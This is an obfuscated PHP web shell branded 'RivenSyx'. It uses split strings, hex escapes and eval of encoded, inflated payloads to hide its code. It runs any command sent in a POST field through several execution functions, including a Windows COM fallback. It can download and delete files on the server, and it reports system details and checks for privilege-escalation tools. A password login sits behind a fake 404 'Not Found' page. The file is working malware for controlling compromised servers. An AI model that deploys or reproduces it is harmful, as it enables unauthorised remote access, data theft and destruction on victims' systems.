<?php
session_start();set_time_limit(0);error_reporting(0);@ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67',null);@ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73',0);@ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65',0);@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67',0);@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73',0);date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');$hayoloh='h'.'tm'.'lspe'.'cialc'.'hars';$func_exist='fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';$f_exist="fil"."e_exi"."sts";$f_size="fi"."les"."ize";$r_file="re"."ad"."fi"."le";$rnd='ro'.'un'.'d';$f_time='fi'.'l'.'em'.'ti'.'m'.'e';$b_name="ba"."sena"."me";$glb='g'.'l'.'o'.'b';$is_d='is'.'_'.'d'.'i'.'r';$is_f='is'.'_'.'f'.'i'.'l'.'e';$unl='u'.'n'.'l'.'i'.'n'.'k';$rm_d='r'.'m'.'d'.'i'.'r';$cr_ea_teF_old_er="mk"."d"."ir";$fo='fo'.'p'.'e'.'n';$fw='f'.'wr'.'it'.'e';$fc='f'.'cl'.'os'.'e';$fr='f'.'re'.'a'.'d';$f_get='f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nten'.'t'.'s';$f_put='f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';$is_rsrc='is'.'_'.'re'.'so'.'ur'.'ce';$sgc='s'.'trea'.'m_g'.'et_c'.'ont'.'ents';$proc='pr'.'oc'.'_'.'o'.'pen';$proc_cls='p'.'ro'.'c'.'_'.'c'.'lose';$pop='p'.'ope'.'n';$pop_cls='pc'.'lose';$exc='e'.'x'.'ec';$sys='s'.'ys'.'t'.'em';$pass='pa'.'s'.'sth'.'ru';$sh_exc='s'.'he'.'ll'.'_'.'e'.'xe'.'c';$com='C'.'O'.'M';$wscsh='WS'.'cr'.'ipt'.'.'.'S'.'he'.'ll';$cMdexe='c'.'md'.'.'.'e'.'x'.'e';$preg='pr'.'eg_'.'mat'.'ch';$regex='2'.'>'.'&'.'1';$gflate='g'.'zi'.'nf'.'l'.'at'.'e';$b64='b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';$nelrts='s'.'tr'.'l'.'en';$rhc='c'.'h'.'r';$dro='o'.'r'.'d';$f_perm='f'.'il'.'ep'.'e'.'r'.'ms';$u_n_a_me="p"."hp"."_"."un"."ame";$cw="ge"."tc"."wd";$d_name='d'.'ir'.'na'.'m'.'e';$psx_euid='p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';$psx_egid='p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';$psx_usr_uid='p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';$psx_grp_gid='p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';$myuid='g'.'et'.'my'.'ui'.'d';$mygid='g'.'et'.'my'.'gi'.'d';$cur_usr='g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';$own_f='fi'.'le'.'ow'.'n'.'er';$grp_f='fi'.'le'.'gr'.'ou'.'p';$g_host_name='g'.'et'.'ho'.'st'.'b'.'yn'.'am'.'e';$is_w='is'.'_'.'wr'.'it'.'ab'.'le';$is_r='is'.'_'.'re'.'ad'.'ab'.'le';if(isset($_GET['downloadfile'])){$get_file=$_GET['downloadfile'];global $f_exist;global $f_size;global $r_file;global $b_name;if($f_exist($get_file)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header("Cache-Control: no-cache, must-revalidate");header('Content-Transfer-Encoding: binary');header("Expires: 0");header("Cache-Control: no-cache, must-revalidate, max-age=60");header('Content-Disposition: attachment; filename="'.$b_name($get_file).'"');header('Content-Length: '.filesize($get_file));header('Pragma: public');ob_clean();flush();$r_file($get_file);exit();}else{echo '<s'.'cr'.'ip'.'t'.'>a'.'le'.'rt'.'('.'"'.'Fa'.'il'.'ed '.'To'.' D'.'ow'.'nl'.'oa'.'d '.'Thi'.'s F'.'il'.'e :(\n'.$get_file.'"); hi'.'st'.'ory'.'.ba'.'ck'.'()'.'</'.'sc'.'r'.'ip'.'t>';}}function deleteDir($dirName){global $f_exist;global $glb;global $is_d;global $unl;global $rm_d;if(!$f_exist($dirName)){return false;}$files=$glb($dirName.'/*');foreach($files as $file){$is_d($file)?deleteDir($file):$unl($file);}$rm_d($dirName);return true;}function deleteFile($fileName){global $f_exist;global $unl;if($f_exist($fileName)){if($unl($fileName)){return true;}else{return false;}}else{return false;}}function rivenC($komendnya){global $hayoloh;global $fw;global $fc;global $fr;global $is_rsrc;global $sgc;global $proc;global $proc_cls;global $pop;global $pop_cls;global $exc;global $sys;global $pass;global $sh_exc;global $com;global $wscsh;global $cMdexe;global $func_exist;global $preg;global $regex;if(!$preg('/'.$regex.'/i',$komendnya)){$komendnya=$komendnya.' '.$regex;}if($func_exist($proc)){$descriptors=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w'],];$process=$proc($komendnya,$descriptors,$pipes);if($is_rsrc($process)){$fw($pipes[0],'input_data_here');$fc($pipes[0]);$output=$sgc($pipes[1]);$errors=$sgc($pipes[2]);$fc($pipes[1]);$fc($pipes[2]);$resultCode=$proc_cls($process);return trim($hayoloh(stripslashes($output)));}}elseif($func_exist($pop)){$process=$pop($komendnya,'r');$read=$fr($process,2096);return trim($hayoloh(stripslashes(print_r("$process: ".gettype($process)."\n$read \n"))));$pop_cls($process);}elseif($func_exist($exc)){$exc($komendnya,$output,$returnCode);if($returnCode===0){$res=implode($output);return trim($hayoloh(stripslashes($res)));ob_flush();flush();}}elseif($func_exist($sys)){$out=$sys($komendnya);return trim($hayoloh(stripslashes($out)));}elseif($func_exist($pass)){$out=$pass($komendnya);return trim($hayoloh(stripslashes($out)));}elseif($func_exist($sh_exc)){$out=$sh_exc($komendnya);return trim($hayoloh(stripslashes($out)));}elseif($func_exist($com)){$cangkang=new $com($wscsh);$kom_mand="$cMdexe /c ".$komendnya;$output=$cangkang->Exec($kom_mand)->StdOut->ReadAll();return trim($hayoloh(stripslashes($output)));}else{return 'The F'.'un'.'ct'.'io'.'n T'.'o R'.'u'.'n The C'.'om'.'ma'.'nd I'.'s Di'.'sa'.'bl'.'e On T'.'h'.'is Se'.'rv'.'er';}}if(isset($_POST['Rsynx'])){$komendnya=$_POST['Rsynx'];echo rivenC($komendnya);}function rivenRead($this_file){global $hayoloh;global $func_exist;global $f_get;global $fo;global $fr;global $fc;$cantread='Cant Not Read '.$this_file;$content='';if($func_exist($fo)){$fi_le=$fo($this_file,'r');if($fi_le){$headers=get_headers($this_file);if($headers&&strpos($headers[0],'403 Forbidden')!==false){$content=rivenC('cat "'.addslashes($this_file).'"');}while(!feof($fi_le)){$content.=$fr($fi_le,8192);}$fc($fi_le);return $content;}else{echo $cantread;return false;}}elseif($func_exist($f_get)){$content=$f_get($this_file);if($content){$headers=get_headers($this_file);if($headers&&strpos($headers[0],'403 Forbidden')!==false){$content=rivenC('cat "'.addslashes($this_file).'"');}return $content;}else{echo $cantread;return false;}}else{echo $cantread;return false;}}function LTs($bLTs){$gflate='g'.'zi'.'nf'.'la'.'te';$b64='ba'.'se'.'64_'.'de'.'co'.'de';$nelrts='st'.'rl'.'en';$rhc='c'.'h'.'r';$dro='o'.'r'.'d';$bLTs=$gflate($b64($bLTs));for($i=0;$i<$nelrts($bLTs);$i++){$bLTs[$i]=$rhc($dro($bLTs[$i])-1);}return $bLTs;}@eval(LTs("jVXbbtNAEP0AvmKx+pC8IK/3ltgqFaBKIOChRbQCtorSxm6rpklIXFio8u3MZe04SRFEWsWX2TMzZ84eCwG/Z+J6Xs9F+WFZvS/EzJ1cmlwc1GWoxaFIvMwyL7Xx0kpYhq6DU3CtfchSeG8oJugr7zJ8lIgX4uBhOV3BfwIPjLcpvJZ0GVS8Ns4HggN4C3Ampftgr2hpRg4AKY1GZM3AjwBpKlgKcGJqY71MIdhkyfpbQu/wnkrPLMXBOy8V5NQlvIP8eoIxyUXExHcy2963jYl1D+i/iaX8UkOcJZy2WUyg2yspYQFTHXZuF+PJZFmumCLuLIlbdpkigoEhYocwJhxjHQ8Gug8OhqHGLf7lcv5zVS4bVISipjuz0JfMvwVEW0YkRolM35XLgrXx48vn5UMh7gf1iQVtrG5GMF5QR5e43WHA9dYwcAD4bncY1KI0+HxrGN19nSHuDaMRA8WCBoOGYcS6z7+/rwcFSzsXt5XoPS/vF/Wv3sHo0/Hp2fEpYhGOjovxZKposEEPOS+KJtPcq0TxpslFvy8eu5MEOp5GxdlTlXqDSgxJG2MqzoSoLCPQZpYUYi3K6aqENE+XLmW6X7pqWoAxSBdpdyxE1HWqOXmqd+P+0RJmIxIybonIUPE/orAAXNTtJlvQejdu02oYd1v9a3ryGBO1UlEZdK9cPNCa07XQ0jQsrlkO715N02HBqsijRR2K3n9IQgE34ogwU3I+XnBOcuzBDtgOHT3E05r0qQQ4rsCGcY876A2PrYAxIzWlMGtysd7agUeAjgK7AR81FRFQ/tGzpISdSRQ/OXnBZzcX1e20HF2X9ehqPqvLWb3qcTPkHLRSsnV2kYoXWT768tA3JmPZJugrgAZk8esAYVACHnzTPMKuIQLNpSJyIBju0McUuozyaGdKems9pAnKcGqyJsntgi0FhdQCMJRHwnEYixN3/E5mkYIhlUr4ll2aWEGeHeXEUNxOardsKBKPJH1JJLOBE8cUjuvH71y0WIn6Qu1ZtmNauE2zDQdVERyKAYkjtrAyIA/3BjXxhlsmZ6eVtQuZokfKOyKFHqZeW9YaVuHiuNSE/Bk/0f047Ddfz16fFuLu/O3H3zlZNyh7cbMYPczG92WvCSMHL/gg5JvPxN4537MuY7ZMns0bR+VaKwOuW+OlOgquKhdHL/8A"));$whoami="\x52\x69\x76\x65\x6e\x53\x79\x78";$profile="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x73\x2e\x63\x6c\x6f\x75\x64\x69\x6e\x61\x72\x79\x2e\x63\x6f\x6d\x2f\x64\x64\x39\x65\x61\x74\x6d\x6a\x75\x2f\x69\x6d\x61\x67\x65\x2f\x75\x70\x6c\x6f\x61\x64\x2f\x76\x31\x37\x35\x33\x30\x31\x30\x33\x32\x39\x2f\x73\x69\x67\x6d\x61\x53\x79\x6e\x78\x5f\x61\x74\x61\x6d\x36\x31\x2e\x70\x6e\x67";$icons="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x73\x2e\x63\x6c\x6f\x75\x64\x69\x6e\x61\x72\x79\x2e\x63\x6f\x6d\x2f\x64\x64\x39\x65\x61\x74\x6d\x6a\x75\x2f\x69\x6d\x61\x67\x65\x2f\x75\x70\x6c\x6f\x61\x64\x2f\x76\x31\x37\x35\x33\x30\x30\x39\x35\x37\x32\x2f\x52\x69\x76\x65\x6e\x73\x5f\x69\x76\x77\x63\x7a\x76\x2e\x6a\x70\x67";function rivenCwd(){global $cw;global $func_exist;global $d_name;if($func_exist($cw)){return@$cw();}else{return $d_name($_SERVER["SCRIPT_FILENAME"]);}}function rivenUn(){global $func_exist;global $u_n_a_me;$u_n_a_me_disable='<font class="font-ubuntu-mono font-green"> Ca'.'nt'.' R'.'ea'.'d Th'.'e Ke'.'rn'.'el'.'! Th'.'e F'.'u'.'nc'.'ti'.'o'.'n '.$u_n_a_me.'() is Di'.'sa'.'bl'.'ed'.'! </font>';$u_n_a_me_active='<font class="font-ubuntu-mono font-green">'.$u_n_a_me('a').'</font>';if($func_exist($u_n_a_me)){return $u_n_a_me_active;}else{return $u_n_a_me_disable;}}function perms($value){global $f_perm;$perms=$f_perm($value);if(($perms&0xC000)==0xC000){$info='s';}elseif(($perms&0xA000)==0xA000){$info='l';}elseif(($perms&0x8000)==0x8000){$info='-';}elseif(($perms&0x6000)==0x6000){$info='b';}elseif(($perms&0x4000)==0x4000){$info='d';}elseif(($perms&0x2000)==0x2000){$info='c';}elseif(($perms&0x1000)==0x1000){$info='p';}else{$info='u';}$info.=(($perms&0x0100)?'r':'-');$info.=(($perms&0x0080)?'w':'-');$info.=(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));$info.=(($perms&0x0020)?'r':'-');$info.=(($perms&0x0010)?'w':'-');$info.=(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));$info.=(($perms&0x0004)?'r':'-');$info.=(($perms&0x0002)?'w':'-');$info.=(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));return $info.'&nbsp;<font class="text-white font-bold">&gt;&gt;</font>&nbsp;'.substr(sprintf('%o',$perms),-4);}function chPerms($value){global $f_perm;$perms=$f_perm($value);return substr(sprintf('%o',$perms),-4);}if(!$func_exist($psx_egid)){$user=$func_exist($cur_usr)?@$cur_usr():"????";$uid=$func_exist($myuid)?@$myuid():"????";$gid=$func_exist($mygid)?@$mygid():"????";$group="?";}else{$uid=$func_exist($psx_usr_uid)&&$func_exist($psx_euid)?@$psx_usr_uid($psx_euid()):array("name"=>"????","uid"=>"????");$gid=$func_exist($psx_grp_gid)&&$func_exist($psx_egid)?@$psx_grp_gid($psx_egid()):array("name"=>"????","gid"=>"????");$user=$uid['name'];$uid=$uid['uid'];$group=$gid['name'];$gid=$gid['gid'];}$serverName=$_SERVER['SERVER_SOFTWARE'];$phpVersion=phpversion();function serverIp(){global $func_exist;global $g_host_name;$serverAddr=@$_SERVER["SERVER_ADDR"];if(!$serverAddr){if($func_exist($g_host_name)){return@$g_host_name($_SERVER['SERVER_NAME']);}else{return '????';}}else{return $serverAddr;}}function userIp(){return@$_SERVER["REMOTE_ADDR"];}if(@ini_get('safe_mode'))$safeMode='<font class="font-ubuntu-mono font-green">ON</font>';else $safeMode='<font class="font-ubuntu-mono font-yellow">OFF</font>';if(@ini_get('\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73'))$cekFunc='<font class="font-ubuntu-mono font-yellow">'.@ini_get('\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73').'</font>';else $cekFunc='<font class="font-ubuntu-mono font-green">All F'.'un'.'ct'.'io'.'n'.'s Ac'.'ces'.'sib'.'le'.'</font>';$on='<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';$off='<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';function cekCurl(){global $func_exist;global $f_exist;global $on;global $off;if($func_exist('cu'.'rl'.'_'.'in'.'it')||$f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'cu'.'r'.'l')){echo"\x63\x55\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x63\x55\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekWget(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'wg'.'e'.'t')){echo"\x57\x47\x45\x54\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x57\x47\x45\x54\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekPerl(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'pe'.'r'.'l')){echo"\x50\x45\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x50\x45\x52\x4c\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekRuby(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'ru'.'b'.'y')){echo"\x52\x55\x42\x59\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x52\x55\x42\x59\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekPython3(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'py'.'t'.'ho'.'n3')){echo"\x50\x59\x54\x48\x4f\x4e\x33\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x50\x59\x54\x48\x4f\x4e\x33\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekPython2(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'py'.'t'.'h'.'o'.'n2')){echo"\x50\x59\x54\x48\x4f\x4e\x32\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x50\x59\x54\x48\x4f\x4e\x32\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekGcc(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'g'.'c'.'c')){echo"\x47\x43\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x47\x43\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekSudo(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'su'.'d'.'o')){echo"\x53\x55\x44\x4f\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x53\x55\x44\x4f\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}function cekPkexec(){global $f_exist;global $on;global $off;if($f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'pk'.'e'.'xe'.'c')){echo"\x50\x4b\x45\x58\x45\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$on";}else{echo"\x50\x4b\x45\x58\x45\x43\x3a\x26\x6e\x62\x73\x70\x3b\x26\x6e\x62\x73\x70\x3b$off";}}$this_domain=$_SERVER['HTTP_HOST'];$this_url=(empty($_SERVER['HTTPS'])?'http':'https')."://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";$fontawesome_pro_version='v6.5.1';$fontawesome_pro='https://kit-pro.fontawesome.com/releases/'.$fontawesome_pro_version.'/css/pro.min.css';$uikit_css="https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/css/uikit.min.css";$uikit_rtl="https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/css/uikit-rtl.min.css";$uikit_js="https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/js/uikit.min.js";$uikit_icon="https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/js/uikit-icons.min.js";$jquery_version='3.7.1';$jquery='https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';$ajax_version='3.5.1';$ajax='https://ajax.googleapis.com/ajax/libs/jquery/'.$ajax_version.'/jquery.min.js';$passwd='0a2964667787a901aabd4bb17b25bc3c6a4f5d6d';$my_self=(empty($_SERVER['HTTPS'])?'http':'https')."://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";if(isset($_POST['gasken'])){if(SHA1($_POST['passnya'])==$passwd){function setconf($defconf){$gflate='g'.'zi'.'nf'.'la'.'te';$b64='ba'.'se'.'64_'.'de'.'co'.'de';$nelrts='st'.'rl'.'en';$rhc='c'.'h'.'r';$dro='o'.'r'.'d';$defconf=$gflate($b64($defconf));for($i=0;$i<$nelrts($defconf);$i++){$defconf[$i]=$rhc($dro($defconf[$i])-1);}return $defconf;}@eval(setconf("hVbbTttAEP2AfsXWykN4qTzr3XUSq60qSoWEKqoQ+kCNIpPYEBGSKA6qKeLbO5f1JaSokVa21+MzM2fOzEYp/L1Tt+vdWo2rWfwtUWeT3bgYqWKxzKe3+W46W692+WpX9oMUbJhWsUnB0QpxRWkVZamN00oXKRjA12jihql1bFU5i2vmr2gWazFzczbBL8HRVswgeFu5gn2gMT1F5MH4K2JEkDrHF3nMUgiBV2Us4tG7AWIiNkYCgPgx2SI4+qDgTJZWFoNFCMqBkAmRUsOgQKMzCgWdAmAA8RA/wZAIMaQkMBB3g3vAdJA9OMpbMogjn2uOiyAsPxNTzBaZEg9kExFlkbDKEIYjI/ro29im1mccphypbhZTI8Fzeq7eMU4qRGQQAVSDaB6oD6q3y6vdUSK1fvp6eRomqlwe68lI9TZZWWblcqE+qt70x/nF5FfgKwmSUhwxt8ylg+DawyzOL8+2iShnpBaF6r/PHza7p35venEy/nkyJhwz8KxiWDqUFCltwD0z5LpVJvc2Be+hXXB9dKSeVW+xyebzbV6WHNseqiAKKmCFIcRIzUwQsFYAbg8VaxxcIxMk5LTKgkS9qHxZ5ujm36EDhIdOIrlWxDQKA7RmwbAELd4b41MSxxA6kaHW/0mp9tYlirx1UcgD6Fjkp1tvENZpdrzVqYLupvomowTNrFnvyshzFPseM7Ia6GpeQ7+IHB6Lu/BPIqrwqspXM3RzcfoF+nvKoiHADeGVRX2Ge0iRl9bVdDipEoFErJvt+neZbw9FILXpSMtSwpE0K9WD2QNuf2ZKRNFIuCwn36NE3KGf8m76uF2Sm+fA40XyHdfZSW2tDl6oYnt+XHPPlIGTKhGdoWXKCJO1Y9vvQLsanzF5ELG4vd5qHyhsVEET9/HVfYb8cPgY9z1zs7nbTB9X2UPer2nkDk/EeiQzAO2CpqIUognZC3s13hM1JzGKjSlNOiCzymgvOyRGW544TK6/JzSenjTyyJZH3kDGEekJF3uzPPbpZMADwYTBK3I8yQ2pLTmHhEthCh/qIeF1EWtbIryLyY3NrfcG4aL1ToYYnKtzDX0rRkIhDQLfptyaeD757JoRS2gtgmlhxWnOw1FUBF7Vxr/zNek4ZbKIcD+JuKRa6klJUXFohu/HQU3ZhlEX0N8CiNu2MO3A4I94M+hGblolUGm5p2kPIagbadvE7bmI51MLXjf2K8i9gCJ/hmoZFfV/CkwKc2UUlL8XPP99SeSAG6nPn/4C"));echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n "."Su"."cc"."es"."s!"." Yo"."u "."Pr"."o'".");"."</"."sc"."ri"."pt".">";$_SESSION["gidauth"]="gidauth";setcookie('token_gid',$my_self,time()+3600*24);}else{echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Go "."A"."w"."a"."y "."Nu"."b')".";<"."/s"."cr"."ip"."t>";}}if(isset($_GET['logout'])){$_SESSION=[];session_unset();session_destroy();setcookie('token_gid','',time()-3600);echo "<s"."c"."ri"."pt".">"."window.location.assign('".$_SERVER['PHP_SELF']."')"."</"."sc"."ri"."pt".">";exit();}if(empty($_SESSION['gidauth'])){if(empty($_COOKIE['token_gid'])){ 
?>
        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html>
        <head>
            <title><?= '4' . '0' . '4 ' . 'N' . 'o' . 't' . ' ' . 'F' . 'o' . 'u' . 'n' . 'd' ?></title>
        </head>
        <body>
            <h1>Not Found</h1>
            <p><?= 'T' . 'h' . 'e r' . 'eq' . 'ue' . 'st' . 'ed' . ' U' . 'R' . 'L ' . 'wa' . 's n' . 'o' . 't f' . 'ou' . 'nd' . ' o' . 'n t' . 'hi' . 's s' . 'e' . 'rv' . 'e' . 'r.' ?>
            </p>
            <p><?= 'Ad' . 'di' . 'ti' . 'o' . 'na' . 'l' . 'ly' . ',' . ' ' . 'a ' . '4' . '0' . '4 ' . 'N' . 'ot' . ' Fo' . 'un' . 'd e' . 'rr' . 'or ' . 'w' . 'as' . ' e' . 'nc' . 'ou' . 'nt' . 'er' . 'ed' . ' wh' . 'il' . 'e t' . 'ry' . 'in' . 'g ' . 't' . 'o us' . 'e a' . 'n E' . 'rr' . 'or' . 'D' . 'oc' . 'um' . 'en' . 't t' . 'o h' . 'an' . 'dl' . 'e th' . 'e r' . 'eq' . 'ue' . 's' . 't.' ?>
            </p>
            <div id="notfound" style="display: none;">
                <form action="" method="POST">
                    <input type="password" name="passnya" style="background: #fff; border: none;">
                    <button type="submit" name="gasken"
                        style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
                </form>
            </div>
            <script type="text/javascript"
                src="https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/js/rivens.js"></script>
        </body>
        </html>
<?php
        exit();
    }
}
if (isset($_GET['L'])) {
    $path = $_GET['L'];
    chdir($_GET['L']);
} else {
    $path = rivenCwd();
}
$path = str_replace("\\", "/", $path);
?>
<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>..::<?= $whoami ?>::.. <?= $this_domain ?></title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=1024" />
    <meta name="description" content="<?= $whoami ?> Mini" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta property="og:site_name" content="<?= $whoami ?>" />
    <meta property="og:url" content="<?= $this_url ?>" />
    <meta property="og:title" content="..::<?= $whoami ?>::.. <?= $this_domain ?>" />
    <meta property="og:description" content="<?= $whoami ?> Mini" />
    <meta property="og:image" content="<?= $profile ?>" />
    <meta property="og:image:secure_url" content="<?= $profile ?>" />
    <link rel="shortcut icon" href="<?= $icons ?>" type="image/x-icon" />
    <link rel="stylesheet" href="<?= $fontawesome_pro ?>">
    <link rel="stylesheet" href="<?= $uikit_css ?>">
    <script src="<?= $jquery ?>"></script>
    <script>
        function isDesktop() {
            return window.innerWidth >= 1024;
        }
        if (isDesktop()) {
            document.getElementById('viewport').setAttribute('content', 'width=1024');
        }
    </script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/css/rivens.css" media="all">
</head>
<body>
    <header class="uk-width-1-1" style="background: var(--gray-900);">
        <div class="uk-margin-small-left">
            <div class="uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
                <img style="width: 5vh; border-radius: 5px;" src="<?= $profile ?>" alt="<?= $whoami ?>">
                <span class="uk-margin-small-left font-trade-winds uk-text-large"><?= $whoami ?></span>
            </div>
            <div class="uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
                <span class="font-bold"><?= 'Sy' . 's' . 'te' . 'm' ?>: <?= rivenUn(); ?></span>
                <span class="font-bold"><?= 'ID' . '(' . 'Us' . 'er' . '/' . 'G' . 'ro' . 'u' . 'p)' ?>: <font
                        class="font-green font-ubuntu-mono">uid=<?= $uid ?>(<?= $user ?>)&nbsp;gid=<?= $gid ?>(<?= $group ?>)
                    </font></span>
                <span class="font-bold"><?= 'Se' . 'r' . 'v' . 'er ' . 'I' . 'P' ?>: <font class="font-green font-ubuntu-mono">
                        <?= serverIp() ?></font></span>
                <span class="font-bold"><?= 'Yo' . 'u' . 'r I' . 'P' ?>: <font class="font-green font-ubuntu-mono"><?= userIp() ?>
                    </font></span>
                <span class="font-bold"><?= 'S' . 'a' . 'f' . 'e ' . 'Mo' . 'd' . 'e' ?>: <?= $safeMode ?></span>
                <span class="font-bold"><?= 'P' . 'HP' . ' ' . 'Ve' . 'r' . 's' . 'i' . 'on' ?>: <font
                        class="font-green font-ubuntu-mono"><?= $phpVersion ?></font></span>
                <span class="font-bold"><?= 'S' . 'er' . 'v' . 'e' . 'r' ?>: <font class="font-green font-ubuntu-mono">
                        <?= $serverName ?></font></span>
                <span
                    class="font-bold uk-text-wrap uk-flex uk-flex-row uk-flex-wrap"><?= 'Di' . 'sa' . 'b' . 'l' . 'e ' . 'F' . 'un' . 'ct' . 'i' . 'on' ?>:&nbsp;<?= $cekFunc ?></span>
                <span
                    class="font-bold"><?= cekCurl() ?>&nbsp;|&nbsp;<?= cekWget() ?>&nbsp;|&nbsp;<?= cekPython2() ?>&nbsp;|&nbsp;<?= cekPython3() ?>&nbsp;|&nbsp;<?= cekPerl() ?>&nbsp;|&nbsp;<?= cekRuby() ?>&nbsp;|&nbsp;<?= cekgcc() ?>&nbsp;|&nbsp;<?= cekPkexec() ?>&nbsp;|&nbsp;<?= cekSudo() ?></span>
<?php 
$pa_t_hs=explode("/",$path);echo '<span class="font-bold pwd"><i class="fa-duotone fa-folder-tree"></i>&nbsp;&nbsp;PWD: ';echo '<a class="font-red" href="?L=/"><i class="fa-sharp fa-solid fa-slash-forward"></i></a>';foreach($pa_t_hs as $id=>$pat){echo "<a class='path' href='?L=";for($i=0;$i<=$id;$i++){echo $pa_t_hs[$i];if($i!=$id){echo '/';}}echo"'>$pat</a><span class='font-red'>/</span>";}echo "&nbsp;&nbsp;<span class='font-red'>[ <a href='".$_SERVER['PHP_SELF']."' class='home_sh_e_ll'><font class='home_sh_e_ll'>Ho"."me"." "."Sh"."el"."l</font></a> ]</span>";echo '</span>'; 
?>
            </div>
        </div>
    </header>
